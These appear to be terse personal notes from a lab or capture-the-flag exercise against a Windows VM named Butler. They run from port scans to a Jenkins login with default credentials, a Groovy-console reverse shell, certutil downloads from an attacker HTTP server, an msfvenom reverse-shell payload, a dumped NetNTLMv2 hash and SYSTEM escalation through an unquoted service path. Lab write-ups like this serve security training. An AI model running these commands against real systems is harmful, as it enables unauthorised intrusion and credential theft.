nmap -A -p- 192.168.86.198
        Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-07 18:03 GMT
        Nmap scan report for butler.lan (192.168.86.198)
        Host is up (0.010s latency).
        Not shown: 65523 closed tcp ports (conn-refused)
        PORT      STATE SERVICE       VERSION
        135/tcp   open  msrpc         Microsoft Windows RPC ***
        139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
        445/tcp   open  microsoft-ds?
        5040/tcp  open  unknown
        7680/tcp  open  pando-pub?
        8080/tcp  open  tcpwrapped (https://security.stackexchange.com/questions/23407/how-to-bypass-tcpwrapped-with-nmap-scan)
             (Try not using -A, but specify the -sV switch )
        8080/tcp  open  http          Jetty 9.4.41.v20210516**
        49664/tcp open  msrpc         Microsoft Windows RPC
        49665/tcp open  msrpc         Microsoft Windows RPC
        49666/tcp open  msrpc         Microsoft Windows RPC
        49667/tcp open  msrpc         Microsoft Windows RPC
        49668/tcp open  msrpc         Microsoft Windows RPC
        49678/tcp open  msrpc         Microsoft Windows RPC
        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
        Host script results:
        |_nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:6c:c3:71 (Oracle VirtualBox virtual NIC)
        | smb2-security-mode:
        |   3.1.1:
        |_    Message signing enabled but not required
        |_clock-skew: -1h00m02s
        | smb2-time:
        |   date: 2021-12-07T17:10:21
        |_  start_date: N/A

ffuf - no good
nikto -h::
        + Server: Jetty(9.4.41.v20210516)
        + The anti-clickjacking X-Frame-Options header is not present.
        + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
        + Uncommon header 'x-hudson' found, with contents: 1.395
        + Uncommon header 'x-jenkins' found, with contents: 2.289.3
        + Uncommon header 'x-jenkins-session' found, with contents: 293592d3
        + All CGI directories 'found', use '-C none' to test none
        + Uncommon header 'x-instance-identity' found, with contents: MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw43hS+kkhDV0LAwc2YVGFglH5IN1zZfBknSOOnM8uzQe2KSrC0PdLp+bTTNiK80Ill04oLGN5LBVAxwJ0koN0X2FPwGLqM6lJQlw9sESCUK0r6SfyTJJMZbsMaUKgwSFePnEbbheH4tPmNxGtI71812KggjsT22Oi5jKHv3rt2OM3dTa4Ma6jwLwke1Iz/rIYmRuW2pUanPVvyg7V2ZiWfqkMkWWs0WN9Y1MnGfyDrIGMYlDIFDZ1w2J25tBTzCR/tWMXOzyZh34hsbZX8a1bzFa7q+DsfL0D/hdDIG6pOuBO8JhffUsKe7qr4Xp2HQ1z/3AQLo4xYq8ojWOq7xX6wIDAQAB
        + Uncommon header 'x-hudson-theme' found, with contents: default
        + Uncommon header 'cross-origin-opener-policy' found, with contents: same-origin
        + ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
        + Scan terminated:  9 error(s) and 8 item(s) reported on remote host
        + End Time:           2021-12-07 18:44:28 (GMT0) (320 seconds)

RPC - https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc
        msf6 auxiliary(scanner/dcerpc/tcp_dcerpc_auditor) > run
        192.168.86.198 - UUID 99fcfec4-5260-101b-bbcb-00aa0021347a 0.0 OPEN VIA 135 ACCESS GRANTED 00000000000000000000000000000000000000000000000005000000
        [*] 192.168.86.198:135    - Scanned 1 of 1 hosts (100% complete)
        [*] Auxiliary module execution completed

impacket -

dir -u http://192.168.86.198:8080 -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --wildcard 2>/dev/null | grep "Status: 200
            /login
            /oops - Jenkins 2.289.3
telnet <ip> 7680
        nothing

msf6 exploit(multi/http/jenkins_metaprogramming) > run
        no luck with msf & jenkins

burpsuite - brute force
        try default creds && similiar names - admin:password, groovy:jenkins
            **    creds jenkins:jenkins - success    **
                https://www.jenkins.io/security/advisory/2021-11-04/ - CVE's
        script console - "Groovy Script"
                upload revshell - https://github.com/gquere/pwn_jenkins
                       shell must be cmd.exe because it's on windows:
                       setup listener on port
                       success
        (sudo python3 -m http.server 80)
                       C:\Program Files\Jenkins>
                       cd C:\Users\butler:
        certutil.exe -urlcache -f http://<ip>/winpeas.exe winpeas.exe (upload winpeas.exe in victim machine)
                  + Enumerating Security Packages Credentials
                    Version: NetNTLMv2
                    Hash:    butler::BUTLER:1122334455667788:9f10d1e8d5de321eafb775fc35764308:0101000000000000856a514757edd701fab398136deb05e4000000000800300030000000000000000000000000300000ff343832e0d09b41a9126e738bd50b412ff9d18df9e88f7fa32ae4c565f0d3200a00100000000000000000000000000000000000090000000000000000000000
                  + Able to start ssh.agent
            unquoted service paths:
                        WiseBootAssistant(WiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe] - Auto - Running - No quotes and Space detected
                        YOU CAN MODIFY THIS SERVICE: AllAccess
                        File Permissions: Administrators [AllAccess]
                        Possible DLL Hijacking in binary folder: C:\Program Files (x86)\Wise\Wise Care 365 (Administrators [AllAccess])
                        In order to optimize system performance,Wise Care 365 will calculate your system startup time.
                Theory: system runs through path & tries to run each dir as an .exe - as a "check"
                        Able to upload script into "spaces" path to exe. IE: ../Wise/Wise.exe
                            Another tool to look into: "Powerup.exe for privesc"
        msfvenom -p windows/shell_reverse_tcp LHOST=wlan0 LPORT=1337 -f exe -o Wise.exe https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae
                        cd C:/Program Files (x86)/Wise ("icacls ." will list permissions of dir)
                        certutil.exe -urlcache -f http://<ip>/Wise.exe Wise.exe
                            nc -lnvp 1337
                            C:/Program Files (x86)/Wise/B.exe (If ran this way - will execute as butler)
                                Must stop service that is running : "sc stop WiseBootAssistant"::
                                    SERVICE_NAME: WiseBootAssistant **((sq query WiseBootAssistant % to make sure it is stopped))**
                                            TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
                                            STATE              : 3  STOP_PENDING
                                                                    (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
                                            WIN32_EXIT_CODE    : 0  (0x0)
                                            SERVICE_EXIT_CODE  : 0  (0x0)
                                            CHECKPOINT         : 0x3
                                            WAIT_HINT          : 0x1388

                            sc start WiseBootAssistant (This will start the service as "System" because of the unquoted dir B.exe file)
                                **nc -lnvp 1337 should now have NT Authority/System shell**
                                    See "unquoteddir_privesc.png"


